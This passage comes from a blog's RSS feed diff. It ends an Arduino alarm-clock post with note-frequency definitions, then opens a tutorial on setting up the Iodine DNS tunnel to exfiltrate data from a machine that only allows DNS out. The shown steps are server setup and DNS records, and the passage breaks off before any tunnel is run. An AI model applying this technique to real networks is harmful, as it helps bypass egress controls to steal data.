+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// clear the screen and update the time  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  display.clear();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.setFont(ArialMT_Plain_16);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.drawString(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, String(hour()) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; twoDigits(minute()) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; twoDigits(second()));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  display.display();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// The alarm. This is for 6:25 am. 1430 for 2:30 pm
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (String(hour()) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; String(minute()) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;625&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    playMelody();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// update the time every so often. In milliseconds
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  delay(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// contains note definitions so you don&amp;#39;t need to know specific frequencies. Just a bit of music theory
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B0  31
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C1  33
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS1 35
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D1  37
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS1 39
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_E1  41
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_F1  44
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_FS1 46
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_G1  49
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_GS1 52
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_A1  55
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_AS1 58
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B1  62
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C2  65
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS2 69
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D2  73
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS2 78
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_E2  82
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_F2  87
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_FS2 93
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_G2  98
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_GS2 104
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_A2  110
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_AS2 117
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B2  123
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C3  131
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS3 139
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D3  147
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS3 156
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_E3  165
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_F3  175
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_FS3 185
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_G3  196
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_GS3 208
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_A3  220
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_AS3 233
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B3  247
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C4  262
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS4 277
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D4  294
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS4 311
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_E4  330
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_F4  349
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_FS4 370
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_G4  392
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_GS4 415
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_A4  440
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_AS4 466
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B4  494
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C5  523
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS5 554
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D5  587
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS5 622
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_E5  659
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_F5  698
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_FS5 740
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_G5  784
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_GS5 831
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_A5  880
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_AS5 932
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B5  988
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C6  1047
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS6 1109
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D6  1175
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS6 1245
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_E6  1319
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_F6  1397
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_FS6 1480
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_G6  1568
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_GS6 1661
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_A6  1760
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_AS6 1865
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B6  1976
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C7  2093
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS7 2217
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D7  2349
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS7 2489
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_E7  2637
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_F7  2794
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_FS7 2960
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_G7  3136
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_GS7 3322
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_A7  3520
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_AS7 3729
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_B7  3951
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_C8  4186
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_CS8 4435
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_D8  4699
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NOTE_DS8 4978
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/2021/05/24/t-beam-alarm-clock/</guid>
+      <pubDate>Mon, 24 May 2021 21:33:56 -0800</pubDate>
+    </item>
+    
+    <item>
+      <title>Configuring Iodine</title>
+      <link>https://potat0ast.com/2021/05/19/iodine/</link>
+      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction &lt;a href=&#34;#introduction&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;What is Iodine? Rather than defining it, let&amp;rsquo;s start with an example. Let&amp;rsquo;s say you have physical access to a box and you desperately need to exfiltrate some data. However, you quickly discover that you cannot connect outbound on any port except 53. Basic protocol checks prevent you from simply configuring an FTP server on port 53 of your cloud server. And to throw another wrench into the gears, it seems like they have locked you into a set of standard public DNS servers anyway. How will you get any data out through just DNS destined for Google or Cloudflare servers? This is where Iodine comes in. (Some have also noted Iodine&amp;rsquo;s usefulness in getting free wifi on planes and in hotels but we are not doing this)&lt;/p&gt;
+&lt;p&gt;Iodine provides a DNS tunnel on which other protocols such as HTTP or FTP can piggy back, allowing us to upload files with just access to public DNS servers. For more information on how non-DNS data may be carried over DNS, see our previous &lt;a href=&#34;https://svl.sh/oob-dns/&#34;&gt;blog&lt;/a&gt;
+&lt;div class=&#34;box&#34;&gt;
+  &lt;iframe src=&#34;https://svl.sh/oob-dns/&#34;&gt;
+  &lt;/iframe&gt;
+&lt;/div&gt;
+ on out-of-band DNS.&lt;/p&gt;
+&lt;h2 id=&#34;what-you-need&#34;&gt;What you need &lt;a href=&#34;#what-you-need&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;A domain. Grab one off Namecheap or Godaddy, to name a couple domain name registrars.&lt;/li&gt;
+&lt;li&gt;A server to receive the DNS requests. A cloud server or virtual private server (&amp;ldquo;VPS&amp;rdquo;) will be easiest, since it already has a public address and we won&amp;rsquo;t need to port forward anything.&lt;/li&gt;
+&lt;li&gt;A target. Probably one that has some painful networking restrictions.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;step-1-set-up-your-server&#34;&gt;Step 1: Set up your server &lt;a href=&#34;#step-1-set-up-your-server&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;First, create an Ubuntu server on your VPS provider of choice. On that server:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Make sure you disable any conflicting DNS services on port 53. See other blogs on Linux sysadmin basics for more information on the command to use. Most likely, the following command will work:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl stop systemd-resolved
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can also run &lt;code&gt;apt update&lt;/code&gt; and &lt;code&gt;apt upgrade&lt;/code&gt; as needed. This should not be an issue because you just made the VPS, and it should be a relatively new image. But it is good practice and may fix problems with outdated packages.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s compile and install the server binary (both the client and server binary are the same, just run with different arguments and flags).
+First, clone the repository to your system.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/yarrick/iodine.git
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once the iodine repo is in your current directory, enter the directory with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd iodine
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ensure that you have the libz-dev installed. This library, used for data compression, is necessary for the compilation process (transporting data over DNS means that data compression is going to play a big role in maximizing throughput). Install the package using:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install libz-dev
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we compile the app using:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And now install it (installing in general is moving files to the right locations for execution; here, we just move the compiled binary to a directory in the path). Use the command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make install
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;step-2-configure-your-dns-entries&#34;&gt;Step 2: Configure your DNS entries &lt;a href=&#34;#step-2-configure-your-dns-entries&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Next we need to ensure that DNS requests can reach our server.
+Our first entry will be to give our &amp;ldquo;DNS&amp;rdquo; server an FQDN. Go to your domain registrar&amp;rsquo;s website and open the DNS settings for the domain you want to use.&lt;/p&gt;
+&lt;p&gt;We will start by adding an A record that will point to the IP of your hosted server. The entry should look something like the following, depending on your registrar&amp;rsquo;s web site:
+|Type |Host |Value | TTL |
+|A Record | ns | IP Address | Auto |
+An A record is one of the simplest types of records, and it determines what IP to direct traffic to when a certain hostname is requested. In this example, let&amp;rsquo;s say you bought &lt;code&gt;testeroni.com&lt;/code&gt;. The above record will direct any traffic destined for &lt;code&gt;ns.testeroni.com&lt;/code&gt; to the IP address you specify. If you wanted another host on this domain, you can give it another name like &lt;code&gt;computer1&lt;/code&gt; and it would be reachable on &lt;code&gt;computer1.testeroni.com&lt;/code&gt;.&lt;/p&gt;
